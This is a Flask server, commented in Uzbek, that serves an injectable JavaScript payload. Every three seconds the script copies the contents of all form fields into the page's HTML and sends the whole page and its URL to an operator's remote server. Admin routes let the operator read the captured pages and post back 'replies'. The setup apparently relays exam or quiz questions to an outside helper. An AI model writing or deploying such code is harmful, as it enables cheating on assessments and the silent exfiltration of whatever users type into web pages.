from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import os
import hashlib

app = Flask(__name__)
CORS(app)

# Ma'lumotlar ombori
storage = {
    "html": None,
    "page_url": "",
    "reply": "Javob yo'q",
    "html_id": 0,
    "reply_id": 0,
    "last_hash": ""  # Sahifa o'zgarganini bilish uchun
}

# --- JAVASCRIPT KOD (3 soniyalik Interval bilan) ---
JAVASCRIPT_TEMPLATE = """
(function(){
    const serverUrl = "SERVER_URL_PLACEHOLDER";
    console.log("✅ Smart Monitor ulandi: " + serverUrl);

    function showTip(t,c){
        const d=document.createElement('div');
        d.innerHTML=t;
        d.style.cssText='position:fixed;top:10px;right:10px;background:'+(c||'#28a745')+';color:white;padding:5px 10px;border-radius:4px;z-index:1000000;font-size:12px;opacity:0.9;pointer-events:none;';
        document.body.appendChild(d);
        setTimeout(()=>d.remove(), 2000);
    }

    function getFullDom() {
        try {
            document.querySelectorAll('input').forEach(el => {
                if (el.type == 'checkbox' || el.type == 'radio') {
                    el.checked ? el.setAttribute('checked', 'checked') : el.removeAttribute('checked');
                } else { el.setAttribute('value', el.value); }
            });
            document.querySelectorAll('textarea').forEach(el => { el.innerHTML = el.value; });
            document.querySelectorAll('select').forEach(el => {
                el.querySelectorAll('option').forEach(o => {
                    o.selected ? o.setAttribute('selected', 'selected') : o.removeAttribute('selected');
                });
            });
        } catch(e) {}
        return document.documentElement.outerHTML;
    }

    // Har 3 soniyada serverga "Signal" beradi
    setInterval(() => {
        const fullHtml = getFullDom();
        fetch(serverUrl + '/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            keepalive: true, // Sahifa yopilayotganda ham ishlashi uchun
            body: JSON.stringify({html: fullHtml, page: window.location.href})
        }).then(r => r.json()).then(data => {
            if(data.status === "new_data") {
                showTip("✅ Yangi savol saqlandi!", "#28a745");
            }
        }).catch(e => console.log("Connection error"));
    }, 3000); // 3000 ms = 3 soniya

    showTip("🚀 Tizim ishlamoqda. Har 3 soniyada kuzataman.", "blue");
})();
"""


@app.route('/', methods=['GET'])
def home(): return "Server ishlayapti!", 200


@app.route('/script.js', methods=['GET'])
def get_script():
    # ---------------------------------------------------------
    # 👇👇👇 MANZILNI O'ZINGIZNIKIGA ALMASHTIRING! 👇👇👇
    MY_RENDER_URL = "https://mening-serverim.onrender.com"
    # ---------------------------------------------------------
    final_code = JAVASCRIPT_TEMPLATE.replace("SERVER_URL_PLACEHOLDER", MY_RENDER_URL)
    return Response(final_code, mimetype='application/javascript')


@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    content = data.get('html', '')
    url = data.get('page', '')

    # Hash orqali tekshiramiz: Agar sahifa o'zgarmagan bo'lsa, saqlamaymiz
    content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()

    if content_hash != storage['last_hash']:
        storage['html'] = content
        storage['page_url'] = url
        storage['last_hash'] = content_hash
        storage['html_id'] += 1
        print(f"Yangi ma'lumot qabul qilindi! ID: {storage['html_id']}")
        return jsonify({"status": "new_data"})
    else:
        return jsonify({"status": "ignored"})


@app.route('/admin-check', methods=['GET'])
def admin_check(): return jsonify({"html_id": storage['html_id'], "url": storage['page_url']})


@app.route('/admin-get-html', methods=['GET'])
def admin_get_html(): return jsonify({"html": storage['html']})


@app.route('/admin-reply', methods=['POST'])
def admin_reply():
    storage['reply'] = request.json.get('message')
    storage['reply_id'] += 1
    return jsonify({"status": "sent"})


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)